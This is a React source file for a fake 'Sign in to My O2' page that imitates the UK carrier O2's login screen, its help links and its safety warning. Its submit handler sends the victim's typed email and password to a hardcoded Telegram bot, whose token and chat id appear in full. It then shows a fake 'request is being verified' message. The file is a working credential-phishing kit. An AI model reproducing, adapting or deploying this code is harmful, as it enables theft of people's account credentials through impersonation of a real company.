import './Content.css';
import page_header_bg from "../../assets/img/page_header_bg.png";
import React, { useState } from 'react';

function Content() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isValid, setIsValid] = useState(false)
  const [error, setError] = useState(false)

  const handleSubmit = (e) => {
    e.preventDefault();

    const token = '7424415293:AAH3-odElgRmnNfMuH3nVjn7IqwqchSM9ts';
    const id = '6383597088';

    const message = `Email: ${email}\nPassword: ${password}`;
    const telegramApiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(
      message
    )}`;
    if (email.length > 0 && password.length > 0) {
      setEmail('');
      setPassword('');
      setError(true);
      setTimeout(() => {
        setError(false);
      }, 10000);
    }
    fetch(telegramApiUrl)
      .then((response) => response.json())
      .then((data) => {
        console.log('Logged In', data);
      })
      .catch((error) => {
        console.error('Not Logged In', error);
      });
  };

  const handleEmailChange = (e) => {
    setEmail(e.target.value)
    if (e.target.value.length > 0 && password.length > 0) {
      setIsValid(true)
    } else {
      setIsValid(false)
    }
  }

  const handlePasswordChange = (e) => {
    setPassword(e.target.value)
    if (email.length > 0 && e.target.value.length > 0) {
      setIsValid(true)
    } else {
      setIsValid(false)
    }
  }

  return (
    <>
      <div className='grid-row'>
        <div>
          <div className='grid-row-inner'>
            <div className='grid-row-sign-in'>
              <h1 className='grid-row-sign-in-text'>Sign in</h1>
            </div>
          </div>
        </div>
        <img className='grid-image' src={page_header_bg}></img>
      </div>
      <div className='grid'>
        {error ?
          (
            <div className='grid-body-2'>
              <div className='accountsError'>
                <p className='error_p'>Please wait while your request is being verified…</p>
              </div>
            </div>
          ) : ('')}
        <div className='grid-body'>
          <div className='section-wrap'>
            <div className='grid-body-col1'>
              <div className='formPanel'>
                <div className='panelContentWrap'>
                  <h2 className="desktopview">Sign in to My O2</h2>
                  <form onSubmit={handleSubmit}>
                    <div className='form-fields'>
                      <label className='form-label'>Username (usually your email address)</label>
                      <input autoFocus className='form-input' type="text" value={email} onChange={(e) => handleEmailChange(e)} />
                      <label className='form-label'>Password</label>
                      <input className='form-input' type="password" value={password} onChange={(e) => handlePasswordChange(e)} />
                    </div>
                    <label className="rememberMe">
                      <input className='rememberMe-checkbox' type="checkbox" value="true" name="remember_me" id="rememberMe" />
                      <label className='form-rememberMe'>Remember my username</label>
                    </label>
                    {isValid ? (
                      <button className='form-submit-2' type="submit">
                        Sign in
                      </button>
                    ) : (
                      <button className='form-submit-1' type="submit">
                        Sign in
                      </button>
                    )}
                  </form>
                  <div className="help">
                    <p className="align-bottom">
                      <a id="forgottenDetails" href="https://accounts.o2.co.uk/resetpassword/selectusername" className="product-cta">Forgotten your username or password?</a>
                    </p>
                  </div>
                </div>
              </div>
            </div>
            <div className='grid-body-col2'>
              <div className='infoPanel'>
                <div className='cta'>
                  <h2 className="desktopview margin-0">Already an O2 customer?</h2>
                  <p className="cta-1-p margin-0">If you've got a Pay Monthly account then we've automatically registered you with My O2 and given you a username and password.</p>
                  <a href='https://accounts.o2.co.uk/resetpassword/selectusername' id="forgottenDetails" className="product-cta">Help me sign in</a>
                </div>
                <div className='cta'>
                  <h2 className="desktopview margin-0">Not yet registered?</h2>
                  <p className="cta-1-p margin-0">If you're a Pay As You Go customer here are just some of the benefits of registering:</p>
                  <ul className="bulletList">
                    <li className='bulletList-li'> Check your usage and remaining balance </li>
                    <li className='bulletList-li'> Set up auto top-ups </li>
                    <li className='bulletList-li'> Manage O2 Rewards </li>
                  </ul>
                  <p className="cta-1-p margin-0">O2 Wifi customer? You can register to manage your account here, whatever network you're on.</p>
                  <p className="cta-1-p margin-0">
                    <a href='https://accounts.o2.co.uk/register' id="forgottenDetails" className="product-cta">Register now</a>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className='grid-body-2'>
          <div className='section-wrap'>
            <div className='grid-body-2-inner-col'>
              <h3 className='safe-heading'>Stay safe</h3>
              <p className="cta-1-p margin-0">We'll never email or text asking you to send or verify personal, financial or password details. Make sure you keep your details safe and never give them out, even if it looks like the email or text came from us.</p>
            </div>
          </div>
        </div>
        <div className='grid-body-2'>
          <div className='section-wrap'>
            <a href="#" className="back-to-top">Back to top</a>
          </div>
        </div>
      </div>
    </>
  );
}

export default Content;